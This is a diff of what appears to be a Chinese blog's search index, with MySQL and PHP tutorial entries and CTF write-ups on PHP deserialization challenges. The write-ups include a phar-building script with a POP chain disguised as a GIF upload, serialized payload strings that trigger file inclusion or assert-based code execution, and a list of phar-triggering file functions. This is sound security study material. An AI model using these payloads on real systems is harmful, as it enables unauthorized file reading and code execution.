@@ -13,113 +13,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SimplePHP,Phar反序列化</title>
-    <url>/2026/05/19/BUUOJ-web3-Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[题目入口打开题目是一个 Bootstrap 导航栏，有三个页面：首页、查看文件、上传文件。页面底部有一个注释 &lt;!--flag is in f1ag.php--&gt;，提示 flag 在 f1ag.php 中。
-查看文件的链接是 file.php?file=，参数为空，猜测存在文件包含漏洞。
-源码审计先尝试直接读 file.php 的源码，在 ?file=file.php 中看到它引入了 function.php 和 class.php：
-// file.phpinclude &#x27;function.php&#x27;;include &#x27;class.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;);$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;;if(empty($file)) &#123;    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;$show = new Show();if(file_exists($file)) &#123;    $show-&gt;source = $file;    $show-&gt;_show();&#125; else if (!empty($file))&#123;    die(&#x27;file doesn\&#x27;t exists.&#x27;);&#125;
-
-核心逻辑：通过 Show 对象的 _show() 方法来展示文件。继续读 class.php：
-// class.phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;            die(&#x27;hacker!&#x27;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;    &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;
-
-再看看 function.php 中的上传逻辑：
-// function.php 核心逻辑function upload_file_do() &#123;    global $_FILES;    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);&#125;function upload_file_check() &#123;    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);    $extension = end($temp);    if(in_array($extension,$allowed_types)) &#123;        return true;    &#125;    // ...&#125;
-
-代码分析
-_show() 方法的过滤：正则 /http|https|file:|gopher|dict|\.\.|f1ag/i 阻止了直接读取 f1ag.php，常规的 php://filter 伪协议也会因为 file_exists() 检查失败而无法使用。
-
-__construct 中的注释：//$this-&gt;source = phar://phar.jpg，强烈暗示了 Phar 协议的方向。
-
-Test 类中的 file_get()：直接调用 file_get_contents() 读取任意文件并用 base64_encode() 返回，没有任何过滤，是整个攻击链的终点。
-
-上传限制：只检查后缀名，不检查文件内容，可以上传任意内容的 .jpg &#x2F; .gif &#x2F; .png 文件。这正好可以上传 Phar 文件。
-
-文件名规律：md5(原始文件名 . 客户端IP) . &quot;.jpg&quot;，可预测。
-
-
-POP 链分析从终点往起点倒推：
-
-
-
-步骤
-方法
-触发条件
-作用
-
-
-
-终点
-Test::file_get()
-__get() 调用
-读取任意文件，base64 返回
-
-
-4
-Test::__get(&#39;source&#39;)
-访问不存在的 source 属性
-调用 get(&#39;source&#39;)，$params[&#39;source&#39;] 设为目标文件
-
-
-3
-Show::__toString()
-对象被当作字符串
-$this-&gt;str[&#39;str&#39;]-&gt;source 触发 Test 的 __get
-
-
-2
-C1e4r::__destruct()
-对象销毁
-echo $this-&gt;test 触发 Show 的 __toString
-
-
-起点
-Phar 反序列化
-phar:// 协议解析
-触发 __destruct 启动整条链
-
-
-完整调用链：
-phar://upload/xxx.jpg  → 反序列化 C1e4r 对象  → 销毁时调用 C1e4r::__destruct()  → echo Show 对象 触发 Show::__toString()  → $this-&gt;str[&#x27;str&#x27;]-&gt;source 触发 Test::__get(&#x27;source&#x27;)  → Test::get(&#x27;source&#x27;) 调用 file_get(&#x27;/var/www/html/f1ag.php&#x27;)  → base64_encode(file_get_contents(&#x27;f1ag.php&#x27;))  → 输出 base64 编码的源码
-
-构造 Payload&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;// 搭建 POP 链$test = new Test();$test-&gt;params = array(&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;);$show = new Show();$show-&gt;str = array(&#x27;str&#x27; =&gt; $test);$c1e4r = new C1e4r();$c1e4r-&gt;str = $show;// 创建 Phar 文件，伪装成 GIF@unlink(&quot;payload.phar&quot;);@unlink(&quot;payload.jpg&quot;);$phar = new Phar(&quot;payload.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();rename(&quot;payload.phar&quot;, &quot;payload.jpg&quot;);
-
-运行前需要关闭 phar.readonly：
-php -d phar.readonly=0 gen_phar.php
-
-利用过程
-上传 payload.jpg（后缀 .jpg 通过扩展名检查），上传后文件路径为 upload/md5(payload.jpg + IP).jpg
-
-通过 file.php?file=phar://upload/&lt;hash&gt;.jpg 触发 Phar 反序列化
-
-POP 链自动执行，页面返回 f1ag.php 的 base64 编码内容
-
-解码得到 flag：
-
-
-PD9waHAgDQoJLy8kYSA9ICdmbGFnezcyODkzNmNiLWUxMTUtNDIyOS1iOTliLTE3ODFjNzc2NDdiMn0nOw0KID8+DQoNCg==
-
-解码后：
-&lt;?php//$a = &#x27;flag&#123;728936cb-e115-4229-b99b-1781c77647b2&#125;&#x27;;?&gt;
-
-总结这道题考察的知识点：
-
-PHP 文件包含漏洞与常见过滤的绕过
-Phar 反序列化的原理与利用条件（phar:// 协议 + file_exists 等文件操作函数触发）
-
-以下文件传入phar://任何文件 可以触发phar反序列化文件存在性检查​​  file_exists(), is_file(), is_dir(), stat() ​​文件内容读取​​  file_get_contents(), fopen(), readfile() ​​文件信息获取​​ filesize(), filectime(), filemtime() ​​目录操作​​ fileatime(), scandir(), opendir() ​​其他文件操作​​ unlink(), copy()
-
-POP 链的构造思想——从危险函数（file_get_contents）倒推，利用各种魔术方法（__destruct → __toString → __get）串联调用链
-上传功能的扩展名绕过（黑名单不严 + 内容不检查）
-
-Phar 反序列化的关键在于：只要有一个能操作文件的函数（file_exists、file_get_contents、include 等）的参数可控，且 Phar 文件能被上传到服务器，就能触发反序列化漏洞。
-]]></content>
-      <tags>
-        <tag>解题wp</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DeepSeek V4 在 Claude Code 上的部署与使用指南</title>
     <url>/2026/05/16/DeepSeek-V4-%E5%9C%A8-Claude-Code-%E4%B8%8A%E7%9A%84%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
     <content><![CDATA[引言2026 年 4 月 24 日，DeepSeek 正式发布了 DeepSeek-V4 预览版并同步开源。这是自 R1 发布 15 个月后的重大更新，推出了两个版本：V4-Pro 和 V4-Flash。V4 系列在 Agent 能力、超长上下文和推理性能上逼近甚至部分超越了顶级闭源模型，同时以极低的价格和完全开源策略推动 AI 普惠化。
@@ -274,6 +167,557 @@ _ 通配符（匹配任意一个字符）SELECT * FROM products WHERE product_na
 
 
 通过分组计算男女生的成绩平均分
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[MRCTF2020]Ezpop,构造反序列化pop链</title>
+    <url>/2026/05/13/MRCTF2020-Ezpop-%E6%9E%84%E9%80%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</url>
+    <content><![CDATA[拿到题目后先解析代码class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;
+从代码中可以看出
+Modifier类是一个过滤器类，用于过滤输入的文件路径
+Show类是一个显示类，用于显示文件内容
+Test类是一个测试类，用于测试Modifier类的过滤功能
+__wakeup方法用于在反序列化时检查文件路径是否包含特殊字符，如有则过滤
+
+构造pop链1. 发现Modifier类中有include函数,可以作为突破口，把flag.php包含进来查看flag，但是有__invoke方法，所以只有它被当成函数执行的时候才会执行2. 又发现Test类中有__get方法，它把$p变量当成了函数执行，所以可以把$p变量的值设置为Modifier类的实例，这样就可以在__get方法中调用Modifier类的__invoke方法，从而包含flag.php文件，但是只有调用不存在或无法访问的属性时才会调用__get方法3. 发现Show类中__toString方法，它调用了$str变量的source属性，可以把$str变量的值设置为Test类的实例，因为Test中没有source属性，所以这样就可以在__toString方法中调用Test类的__get方法，但是只有它被当成字符串执行时才会调用__toString方法4. 而Show中的construct方法把source属性当成了字符串执行，所以可以把source属性的值设置为Show类的实例，这样就可以在__construct方法中调用Show类的__toString方法，从而包含flag.php文件执行pop链把Modifier类的var属性设置为flag.php,然后各种赋值，最后序列化class Modifier&#123;    protected  $var = &#x27;flag.php&#x27;;    public function append($value)    &#123;        include($value);    &#125;    public function __invoke()    &#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;
+$a = new Modifier;$b = new Show();$c = new Test;$c-&gt;p = $a;$b-&gt;str = $c;$b-&gt;source = $b;echo serialize($b);
+得到序列化字符串
+O:4:”Show”:2:{s:6:”source”;r:1;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”%00*%00var”;s:8:”flag.php”;}}}在*前后加上%00（尽量整个字符串都url编码，这里懒得编码了）
+
+get传参序列化字符串
+并没有显示flag,猜测文件并没有直接输出flag而是设置在变量中，所以把Modifier类的var属性设置为php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php拿到文件的base64编码
+然后解码得到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL(3)</title>
+    <url>/2026/04/02/MySQL%E5%91%BD%E4%BB%A4-3/</url>
+    <content><![CDATA[一.用户管理1. 创建用户基本格式create user &#x27;username&#x27;@&#x27;localhost&#x27; identified by &#x27;password&#x27;;#&#x27;username&#x27;表示安创建的用尸的用尸名#&#x27;localhost&#x27;表示用户可以通过连接到MySQL服务器的本地主机,用‘%’表示允许来自任何主机的连接。#&#x27;password&#x27;表示要创建的用户的密码
+2. 删除用户基本格式drop user &#x27;username&#x27;@&#x27;localhost&#x27;;#&#x27;username&#x27;表示要删除的用户名
+3. 赋予用户权限基本格式grant 权限 on 数据库名.表名 to 用户名@主机名# 多个权限之间用逗号隔开# 数据库名和表名用*代替分别代表所有数据库和所有表# all privileges 表示赋予所有权限
+实例GRANT SELECT, INSERT ON database_name.table_name TO &#x27;username&#x27;@&#x27;localhost&#x27;;# 给予用户名=username的用户数据库database_name的表table_name的SELECT和INSERT权限
+4. 取消用户权限基本格式revoke 权限 on 数据库名.表名 from 用户名@主机名
+实例REVOKE SELECT, INSERT ON database_name.table_name FROM &#x27;username&#x27;@&#x27;localhost&#x27;;# 取消用户名=username的用户数据库database_name的表table_name的SELECT和INSERT权限
+
+5. 查看用户权限基本格式show grants for 用户名@主机名
+实例SHOW GRANTS FOR &#x27;username&#x27;@&#x27;localhost&#x27;;# 查看用户名=username的用户的所有权限
+权限列表
+
+
+权限
+描述
+
+
+
+all privileges
+赋予所有权限
+
+
+select
+查询
+
+
+insert
+插入
+
+
+update
+更新
+
+
+delete
+删除
+
+
+create
+创建
+
+
+drop
+删除
+
+
+alter
+修改
+
+
+二.数据的约束1. 约束类型
+
+
+约束
+描述
+
+
+
+not null
+不允许为空
+
+
+unique
+唯一
+
+
+primary key
+主键
+
+
+default（默认值）
+当列为空时，显示默认值
+
+
+2. 在创建表时添加约束基本格式create table 表名 (    列名 数据类型 约束,    列名 数据类型 约束,    ...);
+3. 在表创建后修改约束基本格式alter table 表名 modify 列名 数据类型 约束;
+删除约束基本格式alter table 表名 modify 列名 数据类型;# 不加约束，默认为允许null
+
+
+
+
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL的配置</title>
+    <url>/2026/03/29/MySQL%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[一.下载从MySQL官网上下载第二个文件（约550MB）
+下载完后跟着系统默认指示操作（在指定文件存放地址的时候最好不要放在c盘（系统盘），MySQL后期占用内存大）操作完后点击finish按钮即下载完成二.配置环境变量刚下载完后是无法通过终端直接连接MySQL数据库的，要把MySQL设置成环境变量才行先进入高级系统设置，在进入环境变量，在系统变量中新建变量，命名MySQL_Home(随意命名)，变量值为C:\Program Files\MySQL\MySQL Server 8.0
+再编辑系统变量里的Path变量，新建一个变量%MySQL_Home%\bin(用%包裹刚创建的MySQL_Home变量可直接代表路径)
+注意：如果Path变量里已经有了类似于phpstudy集成环境自带的MySQL,一定要把新建的MySQL变量放在其前面，不然系统会优先调用phpstudy集成环境自带的MySQL客户端，导致客户端与服务端不匹配，ssh无法认证，从而无法连接数据库。（之前因为这个问题在实验室卡了一个下午加一晚上）
+
+在完成以上配置后就可以通过终端直接连接MySQL了
+三.安装可视化工具MySQL的可视化工具构建图形化界面可以让对MySQL的操作可视化，使操作更方便SQLyog是一个适合初学者的可视化工具，支持中文且不会自动补全命令，便于记忆操作命令下载地址
+
+上框输入操作命令，下框执行命令并可视化此时，MySQL的基本配置已完成]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[NPUCTF2020]ReadlezPHP,反序列化漏洞</title>
+    <url>/2026/05/16/NPUCTF2020-ReadlezPHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[进入题目，查看网页源码
+发现可疑网址，点击进入
+找到题目代码，是反序列化题目核心代码为：public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;
+可以构造变量a—&gt;phpinfo()，变量b—&gt;assert；组合起来后—&gt;assert(phpinfo()),使代码执行phpinfo()assert()函数的功能：
+在 PHP 8 以前的版本（如 5.x），assert() 的参数可以是字符串，并会像 eval() 一样被执行
+
+构造出序列化字符串
+O:8:”HelloPhp”:2:{s:1:”a”;s:9:”phpinfo()”;s:1:”b”;s:6:”assert”;}
+
+get传输使网页执行phpinfo()
+传输之前要把source参数去掉，否则会优先执行highlight_file(FILE);的结果而覆盖phpinfo()的执行结果
+
+ctrl+f搜索flag查找到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP高级用法</title>
+    <url>/2026/04/08/PHP%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[日期和时间date() 函数
+date() 函数用于格式化日期和时间。
+
+&lt;?phpecho date(&quot;Y/m/d&quot;) . &quot;&lt;br&gt;&quot;;echo date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;echo date(&quot;Y-m-d&quot;);?&gt;
+输出结果2026/04/082026.04.082026-04-08
+
+
+
+format字符
+描述
+返回值例子
+
+
+
+Y
+年，四位数字
+例如：1999 或 2003
+
+
+y
+年，两位数字
+例如：99 或 03
+
+
+m
+月，两位数字
+01-12
+
+
+M
+月，完整名称
+January 到 December
+
+
+d
+月份中的第几天，有前导零的 2 位数字
+01-31
+
+
+j
+月份中的第几天，没有前导零
+1-31
+
+
+D
+星期几，缩写
+Mon - Sun
+
+
+l
+星期几,完整名称
+Monday - Sunday
+
+
+H
+小时，24小时制
+00 - 23
+
+
+h
+小时，12小时制
+00 - 12
+
+
+i
+分钟，两位数字
+00 - 59
+
+
+s
+秒，两位数字
+00 - 59
+
+
+包含include() 函数和 require() 函数
+include() 函数和 require() 函数用于包含其他文件的内容
+
+include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：
+require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。
+include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。
+尽量使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性
+
+使用方法&lt;?phpinclude &quot;file.php&quot;;或require &quot;file.php&quot;;?&gt;
+把文件包含后，可以直接调用文件中的公共变量文件处理打开文件&lt;?php$filehandle = fopen(&quot;filename.txt&quot;, &quot;r&quot;);?&gt;
+文件可以通过以下模式打开
+
+
+模式
+描述
+
+
+
+r
+只读，在文件开头读开始
+
+
+r+
+读写，在文件开头读开始
+
+
+w
+只写，打开并清空文件的内容；如果文件不存在，则创建新文件。
+
+
+w+
+读写，打开并清空文件的内容；如果文件不存在，则创建新文件。
+
+
+a
+追加。打开并向文件末尾进行写内容，如果文件不存在，则创建新文件。
+
+
+a+
+读&#x2F;追加，打开并向文件末尾进行写内容，保持文件指针在文件末尾，保持文件内容
+
+
+x
+只写，创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
+
+
+x+
+读写，创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
+
+
+注意：如果 fopen() 函数无法打开指定文件，则返回 0 (false)。关闭文件&lt;?phpfclose($filehandle);?&gt;
+检测文件末尾feof() 函数用于检测文件是否到达末尾。读取文件内容fgets() 函数用于读取文件的一行。# 读取文件的最后一行&lt;?phpif (!feof($filehandle)) &#123;    echo fgets($filehandle);&#125;?&gt;
+运用两函数逐行读取文件内容?php$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);// 读取文件每一行，直到文件结尾while(!feof($file))&#123;    echo fgets($file). &quot;&lt;br&gt;&quot;;&#125;fclose($file);?&gt;
+cookiecookie是一种小文本文件，用于存储用户信息，例如用户名、密码等。当同一个用户再次访问网站时，网站可以使用 cookie来识别用户。setcookie() 函数用于设置 cookie。语法&lt;?phpsetcookie(&quot;cookie名&quot;, &quot;cookie值&quot;, time());?&gt;
+实例&lt;?phpsetcookie(&quot;user&quot;, &quot;lah&quot;, time() + (60 * 5));?&gt;
+回收 cookie可用 $_COOKIE 数组来回收 cookie&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt;
+可用isset() 函数来检查 cookie 是否设置&lt;?phpif (isset($_COOKIE[&quot;user&quot;]))    echo &quot;欢迎 &quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;;else    echo &quot;普通访客!&lt;br&gt;&quot;;?&gt;
+删除 cookie把时间设置为过去的时间（负数）&lt;?phpsetcookie(&quot;user&quot;, &quot;&quot;, time() - (60 * 5));?&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL命令(1)</title>
+    <url>/2026/03/29/MySQL%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[一.创建数据库1. 直接创建数据库（默认字符集和排序规则）create database 数据库名;
+
+2. 判断数据库是否存在，不存在则创建create database if not exists 数据库名;
+
+3. 指定字符集创建数据库create database 数据库名 character set 字符集;
+
+4. 指定字符集和排序规则创建数据库create database 数据库名 character set 字符集 collate 排序规则;
+
+字符集种类
+utf8mb3（支持中文，过时）
+utf8mb4（支持emoji表情，mysql8.0默认字符集）
+
+排序规则种类
+utf8mb3_general_ci（支持中文，过时）
+utf8mb4_general_ci（支持emoji表情，大小写敏感排序）
+utf8mb4_ai_ci（支持emoji表情，unicode排序,大小写和重音敏感排序,mysql8.0默认排序规则）
+utf8mb4_as_ci（支持emoji表情，unicode排序，大小写和重音敏感排序）
+
+注意:创建数据库时，字符集和排序规则必须一致(utf8mb3对utf8mb3_general_ci，utf8mb4对utf8mb4_general_ci)查看数据库字符集和排序规则show variables like &#x27;character_set_database&#x27;;show variables like &#x27;collation_database&#x27;;
+
+二.库的查看与切换1. 查看当前所有库show databases;
+
+2. 查看当前使用库select database();
+
+3. 查看指定库下的所有表show tables from 数据库名;
+
+4. 查看创建库的信息show create database 数据库名;
+
+5. 切换到指定库use 数据库名;
+
+注意:切换库后，当前会话库会改变，后续操作会默认在切换后的库下进行。所以要操作指定库下的表和数据前，需要先切换到该库。三.库的删除与修改1. 删除数据库drop database 数据库名;
+
+2. 判断数据库是否存在，不存在则删除drop database if exists 数据库名;
+
+3. 修改数据库字符集alter database 数据库名 character set 字符集;
+
+4. 修改数据库排序规则alter database 数据库名 collate 排序规则;
+
+5. 同时修改数据库字符集和排序规则alter database 数据库名 character set 字符集 collate 排序规则;
+
+
+四.表的创建1.基本格式create table [if not exists] 表名(列名 类型 [列可选约束][COMMENT&#x27;列可选注释&#x27;],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],列名 类型 [列可选约束][COMMENT&#x27;列可选注释’],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],#列之间使用,分割)[表可选约束][COMMENT‘表可选注释’];
+
+2. 实例create table if not exists book_lib(    book_id int primary key comment &#x27;图书id&#x27;,    book_name varchar(20) comment &#x27;图书名称&#x27;,    book_author varchar(20) comment &#x27;图书作者&#x27;,    book_price double(4,1) comment &#x27;图书价格&#x27;)charset=utf8mb4 coll=utf8mb4_ai_ci;
+
+介绍:创建了一个名为book_lib的表，包含图书id，图书名称，图书作者，图书价格四列，图书id为主键，图书价格为双精度浮点数，图书名称和图书作者均为varchar类型（最大长度为20个字符）。表的字符集为utf8mb4，排序规则为utf8mb4_ai_ci。五.表的数据类型1. 整数类型
+
+
+类型
+存储（字节）
+范围
+
+
+
+tinyint（mysql独有）
+1
+-128~127
+
+
+smallint（sql通用）
+2
+-32768~32767
+
+
+mediumint (mysql独有)
+3
+-16777216~16777215
+
+
+bigint（mysql独有）
+8
+-2^63~2^63-1
+
+
+int（sql通用）
+4
+-2^31~2^31-1
+
+
+注意：加上unsigned后，对应列数据变成无负号整数，范围大小不变，但最小值从0开始。例：stu_age tinyint unsigned COMMENT‘年龄字段,tinyint类型,无符号值从0开始’,stu_age tinyint COMMENT‘年龄字段,tinyint类型,无符号值从-128开始&#x27;,
+
+2. 浮点&#x2F;定点数类型
+
+
+类型
+存储（字节）
+范围
+
+
+
+float
+4
+-3^23~3^23
+
+
+double
+8
+-3^64~3^64
+
+
+stu_height float(4,1) unsigned COMMENT‘身高,保留一位小数,多位会四舍五入,无符号值从0开始’-- 比如180.66会被四舍五入为180.7
+
+注意：从MySQL 8.0.17 开始,不推荐使用非标准FLOAT(M,D)语法DOUBLE(M,D),未来版本中可能删除对它的支持。（支持unsigned修饰,添加修饰,只保留正值范围负值不会迁移到正值!）
+
+
+类型
+存储(字节)
+M(小数+整数位数)
+D(小位数)
+
+
+
+decimal(M,D)
+动态计算
+M最大为65
+D最大为30
+
+
+注意:DECIMAL类型的存储空间是可变的,它的存储大小受DECIMAL数据类型定义时指定的精度和规模影响。如果D小数位数为0,DECIMAL则值不包含小数点或小数部分。例：emp_salary DECIMAL(8,1) COMMENT ‘工资,小数加整数一共8位,保留一位小数,多位会四舍五入’
+
+3. 字符类型
+
+
+类型
+特点
+长度范围（字符）
+
+
+
+char(n)
+固定长度
+0&#x3D;&lt;n&lt;&#x3D;255
+
+
+varchar(n)
+可变长度
+0&#x3D;&lt;n&lt;&#x3D;65535
+
+
+text
+长文本
+0~65535
+
+
+tinytext
+微短文本
+0~255
+
+
+tinyblob
+微短二进制文本
+0~255
+
+
+blob
+二进制文本
+0~65535
+
+
+注意:
+varchar定义时，必须指定最大长度，否则会报错。char定义时，如果不指定最大长度，默认会指定最大长度为1。
+字符类型在存储时，如果数据长度小于最大长度，会在末尾填充空格。
+blob类型是一个二进制大对象，可以容纳可变数量的数据。
+
+4. 日期和时间类型
+
+
+类型
+大小（bytes）
+格式
+范围
+用途
+
+
+
+date
+3
+YYYY-MM-DD
+1000-01-01~9999-12-31
+日期值
+
+
+time
+3
+HH:mm:ss
+-838:59:59~838:59:59
+时间值
+
+
+datetime
+8
+YYYY-MM-DD HH:mm:ss
+1000-01-01 00:00:00 到 9999-12-31 23:59:59
+日期时间值混合
+
+
+year
+1
+YYYY
+1901~2155
+年分值
+
+
+timestamp
+4
+YYYY-DD HH:mm:ss
+1970-01-01 00:00:00 到 2038-01-19 03:14:07
+年分值
+
+
+注意:
+year类型有两位或者四位的表达形式,两位 00-69 &#x3D;2000-2069 70-99&#x3D;1970-1999
+时间类型就是一个特殊格式的字符串,插入数据的时候!,时间类型需要自动赋值,需要手动添加相关的设置
+
+扩展自动填写时间:
+插入默认添加时间
+
+datetime default current_timestamp ;
+
+修改默认更改时间(插入的默认时间)
+
+datetime default current_timestamp on update current_timestamp;
+实例：ACREATE TABLE t2(NAME VARCHAR (20),register_time DATETIME DEFAULT CURRENT_TIMESTAMP COMMENT&#x27;插入自动维护时间&#x27;,update_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;插入维护时间,修改数据自动维护时间&#x27;)
+
+创建t2表:注册日期 字段插入自动添加时间,更新数据不变(插入数据的时候,自动维护时间,后续修改数据,时间不变!)更新日期 字段插入自动添加时间,更新数据时间改变(插入数据需要自动维护时间,修改数据也需要维护时间!)
+六. 表的修改和删除1. 添加列alter table 表名 add 列名 类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
+2. 删除列alter table 表名 drop 列名;
+3. 修改列名alter table 表名 change 原列名 新列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
+4. 修改列类型alter table 表名 modify 列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
+5. 修改表名alter table 表名 rename 新表名;
+6. 删除表drop table [if exists] 表名;
+7. 清除表数据truncate table 表名;
 ]]></content>
       <tags>
         <tag>MySQL</tag>
@@ -553,276 +997,110 @@ private
       </tags>
   </entry>
   <entry>
-    <title>PHP高级用法</title>
-    <url>/2026/04/08/PHP%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[日期和时间date() 函数
-date() 函数用于格式化日期和时间。
+    <title>[SWPUCTF 2018]SimplePHP,Phar反序列化</title>
+    <url>/2026/05/19/%5BSWPUCTF%202018%5DSimplePHP,par%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[题目入口打开题目是一个 Bootstrap 导航栏，有三个页面：首页、查看文件、上传文件。页面底部有一个注释 &lt;!--flag is in f1ag.php--&gt;，提示 flag 在 f1ag.php 中。
+查看文件的链接是 file.php?file=，参数为空，猜测存在文件包含漏洞。
+源码审计先尝试直接读 file.php 的源码，在 ?file=file.php 中看到它引入了 function.php 和 class.php：
+// file.phpinclude &#x27;function.php&#x27;;include &#x27;class.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;);$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;;if(empty($file)) &#123;    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;$show = new Show();if(file_exists($file)) &#123;    $show-&gt;source = $file;    $show-&gt;_show();&#125; else if (!empty($file))&#123;    die(&#x27;file doesn\&#x27;t exists.&#x27;);&#125;
 
-&lt;?phpecho date(&quot;Y/m/d&quot;) . &quot;&lt;br&gt;&quot;;echo date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;echo date(&quot;Y-m-d&quot;);?&gt;
-输出结果2026/04/082026.04.082026-04-08
